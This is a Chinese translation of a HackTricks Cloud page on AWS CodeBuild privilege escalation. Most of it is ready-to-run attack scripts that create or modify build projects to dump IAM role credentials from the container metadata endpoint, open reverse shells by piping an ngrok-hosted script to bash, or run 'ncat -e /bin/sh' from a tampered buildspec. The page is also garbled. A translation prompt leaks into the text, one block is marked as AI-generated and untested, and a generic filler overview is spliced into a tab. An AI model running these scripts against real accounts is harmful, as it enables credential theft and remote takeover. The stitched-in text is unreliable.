# AWS - Codebuild特权升级

<details>

<summary><strong>支持HackTricks并获得福利！</strong></summary>

* 如果您想在HackTricks中看到您的公司广告，或者如果您想访问PEASS的最新版本或下载PDF版本的HackTricks，请查看[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass) 或 **关注**我的 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) **和** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github仓库提交PR来分享您的黑客技巧。**

</details>

## codebuild

在以下位置获取更多信息：

{% content-ref url="../aws-services/aws-codebuild-enum.md" %}
[aws-codebuild-enum.md](../aws-services/aws-codebuild-enum.md)
{% endcontent-ref %}

### `iam:PassRole`, `codebuild:CreateProject`, (`codebuild:StartBuild` | `codebuild:StartBuildBatch`)

具有**`iam:PassRole`, `codebuild:CreateProject`和`codebuild:StartBuild`或`codebuild:StartBuildBatch`**权限的攻击者可以通过创建一个正在运行的Codebuild IAM角色来升级特权。

{% tabs %}
{% tab title="示例1" %}
```bash
# Enumerate then env and get creds
REV="env\\\\n      - curl http://169.254.170.2\$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"

# Get rev shell
REV="curl https://reverse-shell.sh/4.tcp.eu.ngrok.io:11125 | bash"

JSON="{
\"name\": \"codebuild-demo-project\",
\"source\": {
\"type\": \"NO_SOURCE\",
\"buildspec\": \"version: 0.2\\\\n\\\\nphases:\\\\n  build:\\\\n    commands:\\\\n      - $REV\\\\n\"
},
\"artifacts\": {
\"type\": \"NO_ARTIFACTS\"
},
\"environment\": {
\"type\": \"LINUX_CONTAINER\",
\"image\": \"aws/codebuild/standard:1.0\",
\"computeType\": \"BUILD_GENERAL1_SMALL\"
},
\"serviceRole\": \"arn:aws:iam::947247140022:role/codebuild-CI-Build-service-role-2\"
}"


REV_PATH="/tmp/rev.json"

printf "$JSON" > $REV_PATH

# Create project
aws codebuild create-project --cli-input-json file://$REV_PATH

# Build it
aws codebuild start-build --project-name codebuild-demo-project

# Wait 3-4 mins until it's executed
# Then you can access the logs in the console to find the AWS role token in the output

# Delete the project
aws codebuild delete-project --name codebuild-demo-project
```
以下是关于提权技术的黑客书籍的内容。以下内容来自文件pentesting-cloud/aws-security/aws-privilege-escalation/aws-codebuild-privesc.md。将相关的英文文本翻译成中文，并返回翻译结果，保持完全相同的markdown和html语法。不要翻译代码、黑客技术名称、黑客术语、云/SaaS平台名称（如Workspace、aws、gcp...）、泄漏、渗透测试和markdown标签。此外，请不要添加任何额外的内容，只需提供翻译和markdown语法即可。
```bash
# Generated by AI, not tested
# Create a buildspec.yml file with reverse shell command
echo 'version: 0.2
phases:
build:
commands:
- curl https://reverse-shell.sh/2.tcp.ngrok.io:14510 | bash' > buildspec.yml

# Upload the buildspec to the bucket and give access to everyone
aws s3 cp buildspec.yml s3:<S3_BUCKET_NAME>/buildspec.yml

# Create a new CodeBuild project with the buildspec.yml file
aws codebuild create-project --name reverse-shell-project --source type=S3,location=<S3_BUCKET_NAME>/buildspec.yml --artifacts type=NO_ARTIFACTS --environment computeType=BUILD_GENERAL1_SMALL,image=aws/codebuild/standard:5.0,type=LINUX_CONTAINER --service-role <YOUR_HIGH_PRIVILEGE_ROLE_ARN> --timeout-in-minutes 60

# Start a build with the new project
aws codebuild start-build --project-name reverse-shell-project

```
{% endcode %}
{% endtab %}
{% endtabs %}

**潜在影响：**直接提升到任何AWS Codebuild角色。

{% hint style="warning" %}
在**Codebuild容器**中，文件`/codebuild/output/tmp/env.sh`包含访问**元数据凭证**所需的所有环境变量。

该文件包含**环境变量`AWS_CONTAINER_CREDENTIALS_RELATIVE_URI`**，其中包含访问凭证的**URL路径**。它将类似于`/v2/credentials/2817702c-efcf-4485-9730-8e54303ec420`

将其添加到URL **`http://169.254.170.2/`**，您将能够转储角色凭证。

此外，它还包含**环境变量`ECS_CONTAINER_METADATA_URI`**，其中包含获取有关容器的**元数据信息的完整URL**。
{% endhint %}

### `iam:PassRole`，`codebuild:UpdateProject`，（`codebuild:StartBuild` | `codebuild:StartBuildBatch`）

就像在前一节中一样，如果您可以修改构建项目而不是创建它，您可以指定IAM角色并窃取令牌
```bash
REV_PATH="/tmp/codebuild_pwn.json"

# Enumerate then env and get creds
REV="env\\\\n      - curl http://169.254.170.2\$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"

# Get rev shell
REV="curl https://reverse-shell.sh/4.tcp.eu.ngrok.io:11125 | bash"

# You need to indicate the name of the project you want to modify
JSON="{
\"name\": \"<codebuild-demo-project>\",
\"source\": {
\"type\": \"NO_SOURCE\",
\"buildspec\": \"version: 0.2\\\\n\\\\nphases:\\\\n  build:\\\\n    commands:\\\\n      - $REV\\\\n\"
},
\"artifacts\": {
\"type\": \"NO_ARTIFACTS\"
},
\"environment\": {
\"type\": \"LINUX_CONTAINER\",
\"image\": \"aws/codebuild/standard:1.0\",
\"computeType\": \"BUILD_GENERAL1_SMALL\"
},
\"serviceRole\": \"arn:aws:iam::947247140022:role/codebuild-CI-Build-service-role-2\"
}"

printf "$JSON" > $REV_PATH

aws codebuild update-project --cli-input-json file://$REV_PATH

aws codebuild start-build --project-name codebuild-demo-project
```
**潜在影响：** 直接提升任何AWS Codebuild角色的权限。

### `codebuild:UpdateProject`，(`codebuild:StartBuild` | `codebuild:StartBuildBatch`)

与前一节类似，但**没有`iam:PassRole`权限**，您可以滥用这些权限来**修改现有的Codebuild项目并访问它们已分配的角色**。

{% tabs %}
{% tab title="StartBuildBatch" %}
```sh
REV_PATH="/tmp/codebuild_pwn.json"

# Get rev shell
REV="curl https://reverse-shell.sh/4.tcp.eu.ngrok.io:11125 | sh"

# You need to indicate the name of the project you want to modify
JSON="{
\"name\": \"codebuild_lab_3_project\",
\"source\": {
\"type\": \"NO_SOURCE\",
\"buildspec\": \"version: 0.2\\\\n\\\\nbatch:\\\\n  fast-fail: false\\\\n  build-list:\\\\n    - identifier: build1\\\\n      env:\\\\n        variables:\\\\n          BUILD_ID: build1\\\\n      buildspec: |\\\\n        version: 0.2\\\\n        env:\\\\n          shell: sh\\\\n        phases:\\\\n          build:\\\\n            commands:\\\\n              - curl https://reverse-shell.sh/4.tcp.eu.ngrok.io:11125 | sh\\\\n      ignore-failure: true\\\\n\"
},
\"artifacts\": {
\"type\": \"NO_ARTIFACTS\"
},
\"environment\": {
\"type\": \"LINUX_CONTAINER\",
\"image\": \"public.ecr.aws/h0h9t7p1/alpine-bash-curl-jq:latest\",
\"computeType\": \"BUILD_GENERAL1_SMALL\",
\"imagePullCredentialsType\": \"CODEBUILD\"
}
}"

printf "$JSON" > $REV_PATH

# Note how it's used a image from AWS public ECR instead from docjerhub as dockerhub rate limits CodeBuild!

aws codebuild update-project --cli-input-json file://$REV_PATH

aws codebuild start-build --project-name codebuild-demo-project
```
以下是有关AWS CodeBuild特权升级的内容。AWS CodeBuild是一种托管的构建服务，可用于自动化构建、测试和部署应用程序。在进行特权升级时，我们可以利用CodeBuild的某些功能和配置来获取更高的权限。

## 概述

AWS CodeBuild提供了一些功能和配置，可以用于特权升级。以下是一些常见的特权升级方法：

1. **构建环境特权升级**：通过在构建环境中执行特定的命令或利用构建环境中的漏洞，可以获取更高的权限。
2. **构建规范特权升级**：通过修改构建规范文件中的配置，可以执行特权操作或获取更高的权限。
3. **构建日志特权升级**：通过访问构建日志文件，可以获取敏感信息或执行特权操作。

## 构建环境特权升级

在构建环境中，我们可以执行一些特定的命令或利用一些已知的漏洞来获取更高的权限。以下是一些常见的构建环境特权升级方法：

1. **命令注入**：通过构建过程中的用户输入，可以注入恶意命令并执行特权操作。
2. **环境变量特权升级**：通过修改构建环境中的环境变量，可以执行特权操作或获取更高的权限。
3. **容器逃逸**：通过利用构建环境中的容器逃逸漏洞，可以获取主机系统的特权权限。

## 构建规范特权升级

构建规范文件定义了构建过程中的配置和操作。通过修改构建规范文件，我们可以执行特权操作或获取更高的权限。以下是一些常见的构建规范特权升级方法：

1. **特权命令执行**：通过在构建规范文件中添加特权命令，可以执行特权操作。
2. **特权文件访问**：通过在构建规范文件中指定特权文件的路径，可以访问敏感文件或执行特权操作。

## 构建日志特权升级

构建日志文件记录了构建过程中的详细信息。通过访问构建日志文件，我们可以获取敏感信息或执行特权操作。以下是一些常见的构建日志特权升级方法：

1. **敏感信息泄露**：构建日志中可能包含敏感信息，如凭据、API密钥等。
2. **特权命令执行**：通过在构建日志中添加特权命令，可以执行特权操作。

## 防御措施

为了防止AWS CodeBuild特权升级攻击，我们可以采取以下措施：

1. **最小权限原则**：将CodeBuild项目的权限限制为最小权限，仅允许执行必要的操作。
2. **安全构建环境**：确保构建环境的安全性，及时更新和修补漏洞。
3. **审计和监控**：定期审计和监控CodeBuild项目的活动，及时发现异常行为。
4. **访问控制**：使用AWS Identity and Access Management（IAM）来限制对CodeBuild项目的访问权限。
5. **日志管理**：定期检查和监控构建日志，确保敏感信息不会泄露。

以上是有关AWS CodeBuild特权升级的内容。通过了解这些特权升级方法和防御措施，我们可以更好地保护AWS CodeBuild项目的安全性。{% endcode %}
{% endtab %}
```sh
REV_PATH="/tmp/codebuild_pwn.json"

# Enumerate then env and get creds
REV="env\\\\n      - curl http://169.254.170.2\$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"

# Get rev shell
REV="curl https://reverse-shell.sh/4.tcp.eu.ngrok.io:11125 | sh"

JSON="{
\"name\": \"<codebuild-demo-project>\",
\"source\": {
\"type\": \"NO_SOURCE\",
\"buildspec\": \"version: 0.2\\\\n\\\\nphases:\\\\n  build:\\\\n    commands:\\\\n      - $REV\\\\n\"
},
\"artifacts\": {
\"type\": \"NO_ARTIFACTS\"
},
\"environment\": {
\"type\": \"LINUX_CONTAINER\",
\"image\": \"public.ecr.aws/h0h9t7p1/alpine-bash-curl-jq:latest\",
\"computeType\": \"BUILD_GENERAL1_SMALL\",
\"imagePullCredentialsType\": \"CODEBUILD\"
}
}"

# Note how it's used a image from AWS public ECR instead from docjerhub as dockerhub rate limits CodeBuild!

printf "$JSON" > $REV_PATH

aws codebuild update-project --cli-input-json file://$REV_PATH

aws codebuild start-build --project-name codebuild-demo-project
```
{% endcode %}
{% endtab %}
{% endtabs %}

**潜在影响：**直接提升附加的AWS Codebuild角色权限。

### SSM

如果具有足够的权限来启动ssm会话，则可以进入正在构建的Codebuild项目。

codebuild项目需要有一个断点：

<pre class="language-yaml"><code class="lang-yaml">phases:
pre_build:
commands:
- echo 进入pre_build阶段...
- echo "Hello World" > /tmp/hello-world
<strong>      - codebuild-breakpoint
</strong></code></pre>

然后：
```bash
aws codebuild batch-get-builds --ids <buildID> --region <region> --output json
aws ssm start-session --target <sessionTarget> --region <region>
```
有关更多信息，请[**查看文档**](https://docs.aws.amazon.com/codebuild/latest/userguide/session-manager.html)。

### (`codebuild:StartBuild` | `codebuild:StartBuildBatch`), `s3:GetObject`, `s3:PutObject`

攻击者可以通过启动/重新启动特定 CodeBuild 项目的构建来获取在 CodeBuild 进程中执行命令的权限，前提是该项目的 `buildspec.yml` 文件存储在攻击者具有写访问权限的 S3 存储桶中。

注意：此提权仅在 CodeBuild 工作器具有与攻击者不同的角色（希望更高特权）时才相关。
```bash
aws s3 cp s3://<build-configuration-files-bucket>/buildspec.yml ./

vim ./buildspec.yml

# Add the following lines in the "phases > pre_builds > commands" section
#
#    - apt-get install nmap -y
#    - ncat <IP> <PORT> -e /bin/sh

aws s3 cp ./buildspec.yml s3://<build-configuration-files-bucket>/buildspec.yml

aws codebuild start-build --project-name <project-name>

# Wait for the reverse shell :)
```
**影响：**直接提升AWS CodeBuild工作器使用的角色的权限，通常具有高权限。

{% hint style="warning" %}
请注意，buildspec可能以zip格式存在，因此攻击者需要下载、解压缩、修改根目录下的`buildspec.yml`，然后重新压缩并上传。
{% endhint %}

更多详细信息请参见[此处](https://www.shielder.com/blog/2023/07/aws-codebuild--s3-privilege-escalation/)。

**潜在影响：**直接提升附加的AWS CodeBuild角色的权限。

<details>

<summary><strong>支持HackTricks并获得福利！</strong></summary>

* 如果您想在HackTricks中看到您的公司广告，或者如果您想访问PEASS的最新版本或下载PDF格式的HackTricks，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFT**](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass) 或 **关注**我的 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) **和** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github仓库提交PR来分享您的黑客技巧。**

</details>
